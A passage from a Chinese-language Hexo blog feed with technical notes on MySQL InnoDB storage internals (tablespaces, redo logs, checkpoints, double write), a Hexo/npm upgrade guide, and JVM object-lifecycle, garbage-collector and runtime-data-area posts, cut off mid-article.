Tablespace）</p></li><li><p>独立表空间（File-per-table Tablespace）</p></li><li><p>通用表空间（General Tablespace）</p></li><li><p>回滚表空间（Undo Tablespace）</p></li><li><p>临时表空间（The Temporary Tablespace）</p></li></ul><h6 id="系统表空间"><a href="#系统表空间" class="headerlink" title="系统表空间"></a>系统表空间</h6><blockquote><p><strong>系统表空间是</strong> <strong>InnoDB</strong> <strong>数据字典、双写缓冲、修改缓冲和回滚日志的存储位置</strong>，如果关闭独立表空间，它将存储所有表数据和索引。</p></blockquote><h6 id="独立表空间"><a href="#独立表空间" class="headerlink" title="独立表空间"></a>独立表空间</h6><blockquote><p><strong>独立表空间用于存放每个表的数据和索引。</strong>其他类型的信息，如：回滚日志、双写缓冲区、系统事务信息、修改缓冲等仍存放于系统表空间内。因此即使用了独立表空间，系统表空间也会不断增长。在5.7版本中默认开启</p></blockquote><h6 id="通用表空间"><a href="#通用表空间" class="headerlink" title="通用表空间"></a>通用表空间</h6><blockquote><p>通用表空间（General Tablespace）是一个由 CREATE TABLESPACE 命令创建的共享表空间，创建时必须指定该表空间名称和 ibd 文件位置，ibd 文件可以放置于任何 MySQL 有权限的地方。该表空间内可以容纳多张数据表，同时在创建时可以指定该表空间所使用的默认引擎。</p></blockquote><p><strong>通用表空间存在的目的是为了在系统表空间与独立表空间之间作出平衡</strong></p><h6 id="回滚表空间"><a href="#回滚表空间" class="headerlink" title="回滚表空间"></a>回滚表空间</h6><blockquote><p>Undo TableSpace 用于存放一个或多个 undo log 文件。<strong>默认</strong> <strong>undo log</strong> <strong>存储在系统表空间中，</strong>MySql5.7中支持自定义Undo log表空间并存储所有 <strong>undo log</strong>。一旦用户定义了 Undo Tablespace，则系统表空间中的 Undo log 区域将失效。对于 Undo Tablespace 的启用必须在 MySQL 初始化前设置，Undo Tablespace 默认大小为 10MB。Undo Tablespace 中的 Undo log 表可以进行 truncate 操作。</p></blockquote><h5 id="存储架构"><a href="#存储架构" class="headerlink" title="存储架构"></a>存储架构</h5><h6 id="段【Segment】"><a href="#段【Segment】" class="headerlink" title="段【Segment】"></a>段【Segment】</h6><ul><li>表空间由各个段组成，段类型分<code>数据段</code>（叶子节点）、<code>索引段</code>（非叶子节点）、<code>回滚段</code></li><li>MySQL的索引数据结构是B+树，这个树有叶子节点和非叶子节点</li><li>一个段包含多个区，至少有一个区，段扩展的最小单位是区</li></ul><h6 id="区【Extent】"><a href="#区【Extent】" class="headerlink" title="区【Extent】"></a>区【Extent】</h6><ul><li>区是由连续的页组成的空间，大小固定为 <code>1MB</code></li><li>默认情况下，一个区里有64个页</li><li>为了保证区的连续性，InnoDB一次会从磁盘申请4-5个区</li></ul><h6 id="页【Page】"><a href="#页【Page】" class="headerlink" title="页【Page】"></a>页【Page】</h6><ul><li><strong>页是 InnoDB 的基本存储单位</strong>，页默认大小是16K（可配置innodb_page_size），InnoDB 首次加载后便无法更改</li><li>操作系统读写磁盘最小单位是页，4K</li><li>磁盘存储数据量最小单位512 byte</li></ul><h6 id="行（Row）"><a href="#行（Row）" class="headerlink" title="行（Row）"></a>行（Row）</h6><ul><li>InnoDB的数据是以行为单位存储，一个页中包含多个行</li><li>InnoDB提供4种行格式：Compact、Redundant、Dynamic和Compressed</li><li>默认行格式Dynamic</li></ul><h5 id="内存中的数据如何进入磁盘？"><a href="#内存中的数据如何进入磁盘？" class="headerlink" title="内存中的数据如何进入磁盘？"></a>内存中的数据如何进入磁盘？</h5><h6 id="脏页落盘"><a href="#脏页落盘" class="headerlink" title="脏页落盘"></a>脏页落盘</h6><p><strong>什么是脏页？</strong></p><blockquote><p>对于数据库中页的<strong>修改操作</strong>，则首先修改在缓冲区中的页，缓冲区中的页与磁盘中的页数据不一致，所以称缓冲区中的页为**<code>脏页</code>**</p></blockquote><p><strong>脏页如何进入到磁盘？</strong></p><ul><li>脏页从缓冲区刷新到磁盘，不是每次页更新之后触发，而是通过**<code>CheckPoint机制</code>**刷新磁盘</li></ul><h6 id="数据安全性保证-重点"><a href="#数据安全性保证-重点" class="headerlink" title="数据安全性保证(重点)"></a>数据安全性保证(重点)</h6><ul><li><p><strong>Write Ahead Log（WAL）</strong>：<strong>要求数据的变更写入到磁盘前，首先必须将内存中的日志</strong></p><p><strong>写入到磁盘</strong>，InnoDB就是<code>redo log</code></p></li><li><p><strong>Force Log at Commit</strong>：<strong>当事务提交时，所有事务产生的日志都必须刷到磁盘</strong></p></li></ul><h6 id="怎么确保日志就能安全的写入系统"><a href="#怎么确保日志就能安全的写入系统" class="headerlink" title="怎么确保日志就能安全的写入系统"></a><strong>怎么确保日志就能安全的写入系统</strong></h6><p>为了确保每次日志都写入到redo日志文件，在每次将redo日志缓冲写入redo日志后，调用一次</p><p>**<code>fsync</code>**操作，将缓冲文件从文件系统缓存中真正写入磁盘</p><p>与数据直接写入磁盘不同的是</p><ul><li>redo日志不会记录完整的一页数据</li><li>日志是顺序写入，而数据是随机写入。顺序写入效率更高</li><li>可以通过 innodb_flush_log_at_trx_commit 来控制redo日志刷新到磁盘的策略<ul><li><strong>为0时：</strong>每秒写入，与事务无关<ul><li>最多丢失1秒的事务操作</li><li>写入效率最高，安全性最低</li></ul></li><li><strong>为1时：</strong>事务提交，写入磁盘<ul><li>不会丢失数据</li><li>写入效率最低，安全性最高</li></ul></li><li><strong>为2时：</strong>事务提交，写入OS Buffer<ul><li>数据安全性依赖于系统，最多丢1秒事务操作</li><li>写入效率居中，安全性居中</li></ul></li></ul></li></ul><h6 id="CheckPoint机制"><a href="#CheckPoint机制" class="headerlink" title="CheckPoint机制"></a><strong>CheckPoint机制</strong></h6><blockquote><p>它是将缓冲池中的脏页数据刷到磁盘上的机制，决定脏页落盘的时机、条件和脏页的选择等</p></blockquote><h6 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h6><p><strong>sharp checkpoint：</strong>关闭数据库时将脏页全部刷新到磁盘中</p><p><strong>fuzzy checkpoint：默认方式，</strong>在运行时选择不同时机将脏页刷盘，只刷新部分脏页</p><ul><li><strong>Master Thread Checkpoint：</strong>固定频率刷新部分脏页到磁盘，异步操作不会阻塞用户线程</li><li><strong>FLUSH_LRU_LIST Checkpoint：</strong>缓冲池淘汰非热点Page，如果该Page是脏页会执行CheckPoint</li><li><strong>Async&#x2F;Sync Flush Checkpoint：</strong>redo日志不可用时，强制脏页落盘，有了前两个这种一般不会发生</li><li><strong>Dirty Page too much Checkpoint：</strong>脏页占比太多强制进行刷盘，阈值75%</li></ul><h6 id="Double-Write机制"><a href="#Double-Write机制" class="headerlink" title="Double Write机制"></a><strong>Double Write机制</strong></h6><blockquote><p>数据库准备刷新脏页时，将16KB的刷入磁盘，但当写入了8KB时，就宕机了这种只写了部分没完成的情况被称为<strong>写失效Partial Page Write</strong></p></blockquote><p><strong>Double Write</strong>其实就是写两次，在修改记录redo日志前，先做个副本留个“备胎”</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo版本升级操作指南</title>
    <link href="/posts/178618fd.html"/>
    <url>/posts/178618fd.html</url>
    
    <content type="html"><![CDATA[<p>升级hexo 版本  hexo-cli 版本</p><span id="more"></span><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;以下指令均在Hexo目录下操作，先定位到Hexo目录&#x2F;&#x2F;查看当前版本，判断是否需要升级&gt; hexo version&#x2F;&#x2F;全局升级hexo-cli&gt; npm i hexo-cli -g&#x2F;&#x2F;再次查看版本，看hexo-cli是否升级成功&gt; hexo version&#x2F;&#x2F;安装npm-check，若已安装可以跳过&gt; npm install -g npm-check&#x2F;&#x2F;检查系统插件是否需要升级&gt; npm-check&#x2F;&#x2F;安装npm-upgrade，若已安装可以跳过&gt; npm install -g npm-upgrade&#x2F;&#x2F;更新package.json&gt; npm-upgrade&#x2F;&#x2F;更新全局插件&gt; npm update -g&#x2F;&#x2F;更新系统插件&gt; npm update --save&#x2F;&#x2F;再次查看版本，判断是否升级成功&gt; hexo version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JVM与GC调优(四)-对象的生命周期和垃圾回收GC篇</title>
    <link href="/posts/1382b133.html"/>
    <url>/posts/1382b133.html</url>
    
    <content type="html"><![CDATA[<p>Java对象的生命周期，对象从创建过程，到内存中分配方式，如何分配以及何时进入老年代相关。JVM垃圾回收</p><span id="more"></span><h1 id="对象的生命周期"><a href="#对象的生命周期" class="headerlink" title="对象的生命周期"></a>对象的生命周期</h1><h2 id="对象创建的流程"><a href="#对象创建的流程" class="headerlink" title="对象创建的流程"></a>对象创建的流程</h2><h3 id="创建流程"><a href="#创建流程" class="headerlink" title="创建流程"></a>创建流程</h3><p><img src="http://file.hyqup.cn/img/%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA%E8%BF%87%E7%A8%8B.png" alt="对象创建过程"></p><h3 id="对象内存的分配方式"><a href="#对象内存的分配方式" class="headerlink" title="对象内存的分配方式"></a>对象内存的分配方式</h3><p>内存分配的方法有两种：不同垃圾收集器不一样</p><ul><li><p>指针碰撞(Bump the Pointer)</p><blockquote><p>内存地址是连续的（新生代），Serial 和ParNew 收集器</p></blockquote></li><li><p>空闲列表(Free List)</p><blockquote><p>内存地址不连续（老年代），CMS 收集器和 Mark-Sweep 收集器</p></blockquote></li></ul><h3 id="对象内存分配的安全问题"><a href="#对象内存分配的安全问题" class="headerlink" title="对象内存分配的安全问题"></a>对象内存分配的安全问题</h3><p>在并发情况下， 可能出现正在给对象A分配内存，指针还没来得及修改，对象B又同时使用了原来的指针来分配内存的情况</p><p><strong>在JVM中有两种解决办法</strong></p><ul><li>CAS 是<strong>乐观锁</strong>的一种实现方式。虚拟机采用 CAS 配上失败重试的方式保证更新操作的原子性。</li><li>TLAB<strong>本地线程分配缓冲</strong>(Thread Local Allocation Buffer即TLAB)：为每一个线程预先分配一块内存</li></ul><h3 id="对象怎样才会进入老年代？"><a href="#对象怎样才会进入老年代？" class="headerlink" title="对象怎样才会进入老年代？"></a>对象怎样才会进入老年代？</h3><p>对象的分配对象情况如下</p><ul><li><p><strong>新生代</strong>：新对象大多数都默认进入新生代的Eden区。伊甸园（希腊神话）</p></li><li><p><strong>老年代</strong>（四种情况）：</p><ul><li><p><strong>存活年龄太大，默认超过15次【<code>-XX:MaxTenuringThreshold</code>】</strong></p></li><li><p><strong>动态年龄判断</strong>，MinorGC之后，发现Survivor区中的一批对象的总大小大于了这块Survivor区</p><p>的50%，那么就会将此时大于等于这批对象年龄最大值的所有对象，直接进入老年代</p></li><li><p><strong>大对象直接进入老年代</strong>，前提是Serial和ParNew收集器</p></li><li><p>MinorGC后，存活对象太多无法放入Survivor</p></li></ul></li></ul><p><strong>空间担保机制</strong></p><blockquote><p>当新生代无法分配内存的时候，我们想把新生代的<strong>老对象</strong>转移到老年代，然后把<strong>新对象</strong>放入腾空的新生代。此种机制我们称之为<strong>内存担保</strong>。</p></blockquote><h2 id="对象的内存布局"><a href="#对象的内存布局" class="headerlink" title="对象的内存布局"></a>对象的内存布局</h2><blockquote><p>堆内存中，一个对象在内存中存储的布局可以分为三块区域</p></blockquote><ul><li><p><strong>对象头（Header）</strong>Java对象头占8byte。如果是数组则占12byte。因为JVM里数组size需要使用</p><p>4byte存储</p><ul><li><strong>标记字段</strong>MarkWord<ul><li>用于存储对象自身的运行时数据，它是synchronized实现轻量级锁和偏向锁的关键</li><li>默认存储：对象HashCode、GC分代年龄、锁状态等等信息</li><li>锁标志位的变化，存储数据发生变化</li></ul></li><li><strong>类型指针</strong>KlassPoint<ul><li>是对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例</li><li>开启指针压缩存储空间4byte，不开启8byte</li><li>JDK1.6+默认开启</li></ul></li><li><strong>数组长度</strong><ul><li>如果对象是数组，则记录数组长度，占4个byte，如果对象不是数组则不存在</li></ul></li><li><strong>对齐填充</strong><ul><li>保证数组的大小永远是8byte的整数倍</li></ul></li></ul></li><li><p><strong>实例数据（</strong>Instance Data）</p><ul><li>生成对象的时候，对象的非静态成员变量也会存入堆空间</li></ul></li><li><p><strong>对齐填充（</strong>Padding<strong>）</strong></p><ul><li>JVM内对象都采用8byte对齐，不够8byte的会自动补齐</li></ul></li></ul><h2 id="如何访问一个对象"><a href="#如何访问一个对象" class="headerlink" title="如何访问一个对象"></a>如何访问一个对象</h2><ul><li><strong>句柄</strong>：稳定，对象被移动只要修改句柄中的地址</li><li><strong>直接指针</strong>：访问速度快，节省了一次指针定位的开销</li></ul><h1 id="JVM垃圾收集器"><a href="#JVM垃圾收集器" class="headerlink" title="JVM垃圾收集器"></a>JVM垃圾收集器</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>什么是垃圾？</strong></p><blockquote><p>在内存中，没有被引用的对象就是垃圾</p></blockquote><h2 id="如何找到这个垃圾？"><a href="#如何找到这个垃圾？" class="headerlink" title="如何找到这个垃圾？"></a>如何找到这个垃圾？</h2><p>主要是2种：<strong>引用计数法</strong>和<strong>根可达算法</strong></p><ul><li><p><strong>引用计数法（<code>Reference Counting</code>）</strong></p><ul><li><strong>引用计数算法不能解决循环引用问题</strong></li></ul></li><li><p><strong>根可达算法（<code>GCRoots Tracing</code>）</strong></p><ul><li><p>通过一系列的名为<code>GCRoot</code>的对象作为起始点，从这些节点开始向下搜索，搜索所走过的</p><p>路径称为<strong>引用链（<code>Reference Chain</code>）</strong>，当一个对象到GCRoot没有任何引用链相连时，则证明此对象是不可用的，也就是不可达的</p></li></ul></li></ul><p><strong>可作<code>GCRoots</code>的对象</strong></p><ul><li>虚拟机栈中，栈帧的本地变量表引用的对象</li><li>方法区中，类静态属性引用的对象</li><li>方法区中，常量引用的对象</li><li>本地方法栈中，JNl引用的对象、</li></ul><h2 id="回收过程"><a href="#回收过程" class="headerlink" title="回收过程"></a>回收过程</h2><blockquote><p>垃圾对象在死亡前至少经历两次标记</p></blockquote><p><strong>第一次标记</strong>：如果对象可达性分析后，发现没有与GC Roots相连接的引用链，那它将会被第一次标记</p><p><strong>第二次标记</strong>：第一次标记后，接着会进行一次筛选。筛选条件：此对象是否有必要执行finalize() 方法。在 finalize() 方法中没有重新与引用链建立关联关系的，将被进行第二次标记</p><h2 id="对象引用"><a href="#对象引用" class="headerlink" title="对象引用"></a>对象引用</h2><blockquote><p>引用分为强引用（<code>StrongReference</code>）、软引用（<code>SoftReference</code>）、弱引用（<code>WeakReference</code>）、虚引用（<code>PhantomReference</code>）四种，这四种引用强度依次逐渐减弱</p></blockquote><h2 id="如何清除垃圾？"><a href="#如何清除垃圾？" class="headerlink" title="如何清除垃圾？"></a>如何清除垃圾？</h2><ul><li><p><strong>Mark-Sweep</strong> <strong>标记清除算法</strong></p></li><li><p><strong>Copying</strong> <strong>拷贝算法</strong></p></li><li><p><strong>Mark-Compact</strong> <strong>标记压缩算法</strong></p></li></ul><h3 id="标记清除算法（Mark-Sweep）"><a href="#标记清除算法（Mark-Sweep）" class="headerlink" title="标记清除算法（Mark-Sweep）"></a>标记清除算法（<code>Mark-Sweep</code>）</h3><p>最基本的算法，主要分为<strong>标记</strong>和<strong>清除</strong>2个阶段。首先<strong>标记出所有需要回收的对象</strong>，在<strong>标记完成后统一回收</strong></p><p><strong>掉所有被标记的对象</strong></p><p><strong>缺点</strong>：</p><ul><li><p><strong>效率不高</strong>，<strong>标记和清除</strong>过程的效率都不高</p></li><li><p><strong>空间碎片</strong>，会产生大量不连续的内存碎片，会导致大对象可能无法分配，提前触发GC</p></li></ul><h3 id="拷贝算法（Copying）"><a href="#拷贝算法（Copying）" class="headerlink" title="拷贝算法（Copying）"></a>拷贝算法（<code>Copying</code>）</h3><blockquote><p>现在商业虚拟机都是采用这种收集算法来回收新生代</p></blockquote><p>它将可用内存按容量划分为相等的两块，每次只使用其中的一块。当这一块的内存用完</p><p>了，就将还存活着的对象复制到另外一块上面，然后再把已使用过的内存空间一次清理掉</p><p><strong>缺点：</strong></p><ul><li>存在空间浪费</li></ul><h3 id="标记整理算法（Mark-Compact）"><a href="#标记整理算法（Mark-Compact）" class="headerlink" title="标记整理算法（Mark-Compact）"></a>标记整理算法（<code>Mark-Compact</code>）</h3><p>标记过程仍然与“标记-清除”算法一样，然后让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。<strong>没有空间浪费，没有内存碎片化问题</strong></p><p><strong>缺点：</strong></p><ul><li>性能较低，因为除了拷贝对象以外，还需要对象内存空间进行压缩，所以性能较低。</li></ul><h3 id="分代回收（Generational-Collection）"><a href="#分代回收（Generational-Collection）" class="headerlink" title="分代回收（Generational Collection）"></a>分代回收（<code>Generational Collection</code>）</h3><ul><li><strong>新生代</strong>，每次垃圾回收都有大量对象失去，选择<strong>复制算法</strong></li><li><strong>老年代</strong>，对象存活率高，无人进行分配担保，就必须采用<strong>标记清除</strong>或者<strong>标记整理</strong>算法</li></ul><h2 id="用什么清除垃圾"><a href="#用什么清除垃圾" class="headerlink" title="用什么清除垃圾"></a>用什么清除垃圾</h2><p>两大类，串行收集器和并行收集器。<strong>有 8 种不同的垃圾回收器</strong></p><ul><li><p>新生代回收器：<code>Serial</code>、<code>ParNew</code>、<code>Parallel Scavenge</code></p></li><li><p>老年代回收器：<code>Serial Old</code>、<code>Parallel Old</code>、<code>CMS</code></p></li><li><p>整堆回收器：<code>G1</code>、<code>ZGC</code></p></li></ul><h3 id="串行收集器"><a href="#串行收集器" class="headerlink" title="串行收集器"></a>串行收集器</h3><h4 id="Serial收集器"><a href="#Serial收集器" class="headerlink" title="Serial收集器"></a><code>Serial</code>收集器</h4><p><strong>配置参数</strong>：<code>-XX:+UseSerialGC</code></p><p><strong>特点：</strong></p><ul><li><code>Serial</code>新生代收集器，单线程执行，使用复制算法</li><li><code>Serial Old</code>老年代收集器，单线程执行，使用复制算法</li><li>进行垃圾收集时，必须暂停用户线程（挂起，Safepoint）</li></ul><p><strong>Safepoint挂起线程的时机：</strong></p><ul><li>循环的末尾</li><li>方法返回前</li><li>调用方法的call之后</li><li>抛出异常的位置</li></ul><h4 id="Parallel-Scavenge并行收集器"><a href="#Parallel-Scavenge并行收集器" class="headerlink" title="Parallel Scavenge并行收集器"></a><code>Parallel Scavenge</code>并行收集器</h4><p><strong>配置参数：</strong><code>-XX:+UseParallelGC</code></p><p><strong>特点：</strong></p><ul><li>吞吐量优先收集器，垃圾收集需要暂停用户线程</li><li>新生代使用并行回收收集器，采用<strong>复制算法</strong></li><li>老年代使用<strong>串行</strong>收集器，采用<strong>标记-整理算法</strong></li></ul><h4 id="Parallel-Old收集器"><a href="#Parallel-Old收集器" class="headerlink" title="Parallel Old收集器"></a><code>Parallel Old</code>收集器</h4><p><strong>配置参数：</strong><code> -XX:+UseParallelOldGC</code></p><p><strong>特点：</strong></p><ul><li>PS（Parallel Scavenge）收集器的老年代版本</li><li>吞吐量优先收集器，垃圾收集需要暂停用户线程</li><li>老年代使用<strong>并行</strong>收集器，采用<strong>标记-整理算法</strong></li></ul><h4 id="ParNew收集器"><a href="#ParNew收集器" class="headerlink" title="ParNew收集器"></a><code>ParNew</code>收集器</h4><p><strong>配置参数：</strong><code>-XX:+UseParNewGC</code>或者 <code>-XX:ParallelGCThreads=n</code> 设置并行收集器收集时使用的并行收集线程数。一般最好和计算机的CPU相当</p><p><strong>特点：</strong></p><ul><li>新生代并行（<code>ParNew</code>），老年代串行（<code>Serial Old</code>）</li><li>Serial收集器的多线程版本</li><li>单核CPU不建议使用</li></ul><h4 id="CMS收集器"><a href="#CMS收集器" class="headerlink" title="CMS收集器"></a><code>CMS</code>收集器</h4><p><strong>配置参数：</strong><code> -XX:+UseConcMarkSweepGC</code></p><p><strong>特点：</strong></p><ul><li><strong>低延迟：</strong>减少STW对用户体验的影响</li><li>并发收集，可以同时执行用户线程</li><li>不会等到堆填满再收集，到达阈值就开始收集</li><li>采用<strong>标记-清除算法</strong>，所以会产生内存碎片</li></ul><h4 id="G1（Garbage-First）收集器（JDK1-8之后）"><a href="#G1（Garbage-First）收集器（JDK1-8之后）" class="headerlink" title="G1（Garbage-First）收集器（JDK1.8之后）"></a>G1（<code>Garbage-First</code>）收集器（JDK1.8之后）</h4><blockquote><p>G1是一款面向服务端应用的垃圾收集器，<strong>大内存</strong>企业配置的垃圾收集器大多都是G1</p></blockquote><p><strong>配置参数：</strong><code> -XX:+UseG1GC</code></p><p><strong>特点：</strong></p><ul><li>吞吐量和低延时都行的整堆垃圾收集器</li><li>G1最大堆内存支持64GB,最小堆内存2GB</li><li>全局采用<strong>标记-整理算法</strong>收集，局部采用<strong>复制算法</strong>收集</li><li>可预测的停顿</li></ul><h4 id="ZGC（Z-Garbage-Collector）"><a href="#ZGC（Z-Garbage-Collector）" class="headerlink" title="ZGC（Z Garbage Collector）"></a>ZGC（<code>Z Garbage Collector</code>）</h4><blockquote><p>在 JDK11 中引入的一种可扩展的低延迟垃圾收集器，在 JDK15 中发布稳定版</p></blockquote><p><strong>配置参数：</strong><code> -XX:+UseZGC</code></p><p><strong>特点：</strong></p><ul><li><p>并发</p></li><li><p>基于 region</p></li><li><p>压缩</p></li><li><p>NUMA 感知</p></li><li><p>使用彩色指针</p></li><li><p>使用负载屏障</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JVM与GC调优(三)-运行时数据区篇</title>
    <link href="/posts/8be32240.html"/>
    <url>/posts/8be32240.html</url>
    
    <content type="html"><![CDATA[<p>了解内存结构中相关信息，程序计数器、虚拟器栈、本地方法和本地接口栈、堆、方法区</p><span id="more"></span><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote><p>整个JVM构成里面，由三部分组成：类加载系统、<strong>运行时数据区</strong>、执行引擎</p></blockquote><p>按照线程使用情况和职责分成两大类</p><p><strong>线程独享 （程序执行区域）</strong></p><ul><li><p>不需要垃圾回收</p></li><li><p>虚拟机栈、本地方法栈、程序计数器</p></li></ul><p><strong>线程共享 （数据存储区域）</strong></p><ul><li><p>垃圾回收</p></li><li><p>存储类的静态数据和对象数据</p></li><li><p>堆和方法区</p></li></ul><h2 id="一、堆（Heap）"><a href="#一、堆（Heap）" class="headerlink" title="一、堆（Heap）"></a>一、堆（Heap）</h2><h3 id="核心概述"><a href="#核心概述" class="headerlink" title="核心概述"></a>核心概述</h3><blockquote><p>Java堆在JVM启动时创建内存区域去实现对象、数组与运行时常量的内存分配，它是虚拟机管理最大的，也是垃圾回收的主要内存区域 </p></blockquote><ul><li>一个JVM实例只存在一个堆内存，堆也是Java内存管理的核心区域。</li><li>Java堆区在JVM启动的时候即被创建，其空间大小也就确定了。是JVM管理的最大一块内存空间</li><li>堆内存的大小是可以调节的</li><li>《Java虚拟机规范》规定，堆可以处于<strong>物理上</strong>不连续的内存空间中，但在<strong>逻辑上</strong>它应该被视为连续的</li><li>所有的线程共享Java堆，在这里还可以划分线程私有的缓冲区（ Thread Local Allocation Buffer,TLAB)。</li></ul><h3 id="堆空间大小的设置"><a href="#堆空间大小的设置" class="headerlink" title="堆空间大小的设置"></a>堆空间大小的设置</h3><h3 id="新生代与老年代的参数设置"><a href="#新生代与老年代的参数设置" class="headerlink" title="新生代与老年代的参数设置"></a>新生代与老年代的参数设置</h3><h2 id="二、虚拟机栈-栈（Stack）"><a href="#二、虚拟机栈-栈（Stack）" class="headerlink" title="二、虚拟机栈&#x2F;栈（Stack）"></a>二、虚拟机栈&#x2F;栈（Stack）</h2><p>Java虚拟机分堆区、栈区、方法区</p><h3 id="核心概述-1"><a href="#核心概述-1" class="headerlink" title="核心概述"></a>核心概述</h3><blockquote><p>Java 虚拟机栈（Java Virtual Machine Stack），早期也叫Java栈。每个线程在创建时都会创建一个虚拟机栈，其内部保存一个个的栈帧（Stack Frame），对应这一次次的 Java 方法调用。</p></blockquote><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><blockquote><p>主管Java程序的运行，它保存方法的局部变量（8种基本数据类型、对象的引用地址）、部分结果、并参与方法的调用和返回</p></blockquote><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>Java虚拟机栈也是<code>线程私有</code>的，它的生命周期与线程相同（随线程而生，随线程而灭）</li><li>如果线程请求的栈深度大于虚拟机所允许的深度，将抛出StackOverflowError异常；<br>　-  如果虚拟机栈可以动态扩展，如果扩展时无法申请到足够的内存，就会抛出OutOfMemoryError异常；</li></ul><p>　　（当前大部分JVM都可以动态扩展，只不过JVM规范也允许固定长度的虚拟机栈）</p><ul><li>Java虚拟机栈描述的是Java方法执行的内存模型：每个方法执行的同时会创建一个栈帧。</li></ul><h3 id="栈的单位：栈帧（Stack-Frame）"><a href="#栈的单位：栈帧（Stack-Frame）" class="headerlink" title="栈的单位：栈帧（Stack Frame）"></a>栈的单位：栈帧（Stack Frame）</h3><blockquote><p>每个线程都有自己的栈，栈中的数据都是以<strong>栈帧</strong>（Stack Frame）的格式存在</p></blockquote><p><strong>方法与栈帧的关系：</strong></p><p>栈帧是一个内存区块，是一个数据集，维系着方法执行过程中的各种数据信息</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220928204912987.png" alt="image-20220928204912987"></p><p><strong>栈帧的内部结构：</strong></p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220928205653573.png" alt="image-20220928205653573"></p><h4 id="栈的FILO原理"><a href="#栈的FILO原理" class="headerlink" title="栈的FILO原理"></a>栈的FILO原理</h4><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220928211031108.png" alt="image-20220928211031108"></p><p>JVM直接对Java栈的操作只有两个：</p><ul><li>每个方法执行，伴随着压栈（push）</li><li>执行结束后的出栈（pop）</li></ul><p>遵循<code>先进后出</code>、<code>后进先出</code>原则</p><h4 id="栈帧中的信息"><a href="#栈帧中的信息" class="headerlink" title="栈帧中的信息"></a>栈帧中的信息</h4><p>每个栈帧存在以下信息</p><ul><li><code>局部变量表</code></li><li><code>操作数栈</code></li><li><code>动态链接</code></li><li><code>方法返回地址</code></li><li>一些<code>附加信息</code></li></ul><h4 id="局部变量表（本地变量表【Local-veriables】）"><a href="#局部变量表（本地变量表【Local-veriables】）" class="headerlink" title="*局部变量表（本地变量表【Local veriables】）"></a>*局部变量表（本地变量表【Local veriables】）</h4><blockquote><p>定义为一个数字数组，主要用于存储方法参数和定义在方法体内的局部变量</p></blockquote><p>这些数据类型包括各类基本数据类型、对象引用（reference），以及returnAddress类型</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220928220835279.png" alt="image-20220928220835279"></p><p>注意：</p><p>1、<code>非静态</code>方法的话 会有 <code>this</code> 变量 在 index 为0 的位置</p><p>2、<code>double</code>和<code>long</code> 占据两个 slot位 ，一个是 4位</p><p>3、栈帧当中的局部变量表的槽位是可以被<code>重复利用</code>的，出了<code>作用域</code>就会被<code>销毁</code>，后面定义的变量就会占据被销毁的变量的位置</p><p>4、局部变量表中的变量也是重要的<code>垃圾回收根节点</code>，只要被局部变量表中直接或间接引用的对象都不会被回收</p><h4 id="操作数栈（Operaand-Stack）"><a href="#操作数栈（Operaand-Stack）" class="headerlink" title="*操作数栈（Operaand Stack）"></a>*操作数栈（Operaand Stack）</h4><blockquote><p>也叫<code>表达式栈</code>，在方法执行过程中，根据字节码指令，往栈中写入数据或提取数据，即<code>入栈(push)</code>&#x2F;<code>出栈(pop)</code>。并非采用索引访问。</p></blockquote><h5 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h5><p><strong>主要用于保存计算过程的中间结果，同时作为计算过程中变量临时的存储空间；</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testAddOperation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">byte</span> i <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> k <span class="token operator">=</span> i <span class="token operator">+</span> j<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220928224543209.png" alt="image-20220928224543209"></p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220928224548943.png" alt="image-20220928224548943"></p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220928224554113.png" alt="image-20220928224554113"></p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220928224600714.png" alt="image-20220928224600714"></p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220928224605206.png" alt="image-20220928224605206"></p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220928224610548.png" alt="image-20220928224610548"></p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220928224618969.png" alt="image-20220928224618969"></p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220928224622772.png" alt="image-20220928224622772"></p><h4 id="动态链接（Dynamic-Linking）"><a href="#动态链接（Dynamic-Linking）" class="headerlink" title="动态链接（Dynamic Linking）"></a>动态链接（Dynamic 